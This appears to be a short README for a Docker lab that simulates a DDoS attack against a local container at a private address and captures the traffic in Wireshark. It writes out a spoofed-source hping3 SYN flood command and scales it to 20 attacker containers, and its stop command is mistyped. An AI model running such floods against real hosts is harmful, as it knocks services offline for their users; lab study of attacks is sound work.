How to simulate DDoS
-please use it in a virtual environment and Linux system
-Make sure you have Wireshark, Docker and hping3 in your system
1.Open Virtual_webb folder in your terminal
2.Enter this command: docker-compose up -d --build --scale attacker=20
 This will start the web https://172.30.0.100 and attacks. You can modify the number of attackers by changing the number
3.Now you can capture packets on Wireshark or check the NET I/O using this command:
 docker stats target_web
4.Stop attack by using this command: docker -compose dow
Attack is based on this command: hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 172.30.0.100 
**Do not change folder name and file name**
